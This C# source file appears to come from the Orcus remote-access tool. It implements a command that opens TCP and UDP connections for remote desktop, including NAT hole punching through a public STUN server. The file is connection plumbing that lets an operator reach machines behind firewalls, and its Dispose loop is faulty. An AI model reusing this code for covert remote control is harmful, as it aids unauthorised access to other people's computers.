using System;
using System.Collections.Generic;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using Lidgren.Network;
using Orcus.Plugins;
using Orcus.Shared.Commands.ConnectionInitializer;
using Orcus.Shared.DataTransferProtocol;
using Orcus.Shared.Utilities;

namespace Orcus.Commands.ConnectionInitializer
{
    public class ConnectionInitializerCommand : Command, IConnectionInitializer
    {
        private readonly DtpProcessor _dtpProcessor;
        private readonly Dictionary<Guid, IConnection> _connections;
        private readonly object _ipAddressLock = new object();
        private IPAddress _localAddress;

        private IPAddress LocalAddress
        {
            get
            {
                if (_localAddress == null)
                    lock (_ipAddressLock)
                    {
                        if (_localAddress == null)
                            _localAddress = NetworkUtilities.GetLanIp();
                    }

                return _localAddress;
            }
        }

        public ConnectionInitializerCommand()
        {
            _dtpProcessor = new DtpProcessor(this);
            _connections = new Dictionary<Guid, IConnection>();
        }

        public override void Dispose()
        {
            base.Dispose();
            foreach (var connection in _connections)
            {
                _connections.Remove(connection.Key);
                connection.Value.Dispose();
            }
        }

        [DataTransferProtocolMethod]
        public RemoteConnectionInformation GetCoreInformation(ConnectionProtocol connectionProtocol)
        {
            var information = new RemoteConnectionInformation {LocalIpAddress = NetworkUtilities.GetLanIp()};

            if ((connectionProtocol & ConnectionProtocol.Tcp) == ConnectionProtocol.Tcp)
            {
                //nothing available currently
            }

            if ((connectionProtocol & ConnectionProtocol.Udp) == ConnectionProtocol.Udp)
            {
                information.UdpConnectionInformation = new UdpConnectionInformation();

                try
                {
                    var ipAddress = NetworkUtilities.GetLanIp();
                    var socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
                    socket.Bind(new IPEndPoint(ipAddress, 3478));

                    IPEndPoint ipEndPoint;

                    if (SessionTraversalUtilitiesForNAT.IsHolePunchingPossible(socket, out ipEndPoint))
                        information.UdpConnectionInformation.IsHolePunchingPossible = true;
                    socket.Close();
                }
                catch (Exception)
                {
                    // ignored
                }
            }

            return information;
        }

        [DataTransferProtocolMethod]
        public Guid InitializeUdpLanConnection(IPEndPoint serverEndPoint)
        {
            var config = new NetPeerConfiguration("RemoteDesktop") {LocalAddress = LocalAddress};
            var client = new NetClient(config);

            var message = client.CreateMessage();
            message.Write("GARYFUCKINGWASHINGTON");
            client.SendUnconnectedMessage(message, serverEndPoint);
            Thread.Sleep(200);

            var lanConnection = new UdpLanConnection(client, serverEndPoint);
            var connectionGuid = Guid.NewGuid();

            _connections.Add(connectionGuid, lanConnection);

            return connectionGuid;
        }

        [DataTransferProtocolMethod]
        public Guid InitializeTcpLanConnection(IPEndPoint serverEndPoint)
        {
            var client = new TcpClient();
            var result = client.BeginConnect(serverEndPoint.Address, serverEndPoint.Port, null, null);

            var success = result.AsyncWaitHandle.WaitOne(TimeSpan.FromSeconds(5));
            if (!success)
                throw new Exception("Failed to connect.");

            // we are connected
            client.EndConnect(result);

            var lanConnection = new TcpConnection(client);
            var connectionGuid = Guid.NewGuid();

            _connections.Add(connectionGuid, lanConnection);

            return connectionGuid;
        }

        [DataTransferProtocolMethod]
        public UdpHolePunchingFeedback InitializeUdpPunchHolingConnection()
        {
            var config = new NetPeerConfiguration("RemoteDesktopUdpHolePunching")
            {
                LocalAddress = LocalAddress
            };
            config.EnableMessageType(NetIncomingMessageType.NatIntroductionSuccess);

            var netClient = new NetClient(config);
            netClient.InitializeSocket();

            var isBlocking = netClient.Socket.Blocking;
            netClient.Socket.Blocking = true;

            var result = SessionTraversalUtilitiesForNAT.TestStun(SessionTraversalUtilitiesForNAT.GoogleStunServer,
               SessionTraversalUtilitiesForNAT.GoogleStunServerPort, netClient.Socket);
            netClient.Socket.Blocking = isBlocking;

            if (!SessionTraversalUtilitiesForNAT.IsHolePunchingPossible(result.NetType))
                throw new Exception(
                    "STUN server responded with: " + result.NetType + ". Hole punching not possible");

            netClient.InitializeLoop();

            var connectionGuid = Guid.NewGuid();

            _connections.Add(connectionGuid, new UdpHolePunchingConnection(netClient));
            return new UdpHolePunchingFeedback {ConnectionGuid = connectionGuid, PublicEndPoint = result.PublicEndPoint};
        }

        [DataTransferProtocolMethod]
        public void ConnectUdpPunchHolingConnection(Guid connectionGuid, IPEndPoint remoteEndPoint)
        {
            var connection = (UdpHolePunchingConnection) _connections[connectionGuid];
            connection.NetClient.NatIntroduction(false, remoteEndPoint, null, "GARYFUCKINGWASHINGTON");
        }

        public override void ProcessCommand(byte[] parameter, IConnectionInfo connectionInfo)
        {
            switch ((ConnectionInitializerCommunication) parameter[0])
            {
                case ConnectionInitializerCommunication.SendDtpData:
                    var data = _dtpProcessor.Receive(parameter, 1);
                    connectionInfo.UnsafeResponse(this, data.Length + 1, writer =>
                    {
                        writer.Write((byte) ConnectionInitializerCommunication.ResponseDtpData);
                        writer.Write(data);
                    });
                    break;
                default:
                    throw new ArgumentOutOfRangeException();
            }
        }

        protected override uint GetId()
        {
            return 32;
        }

        public IConnection TakeConnection(Guid guid)
        {
            IConnection connection;
            if (_connections.TryGetValue(guid, out connection))
            {
                _connections.Remove(guid);
                return connection;
            }

            return null;
        }
    }
}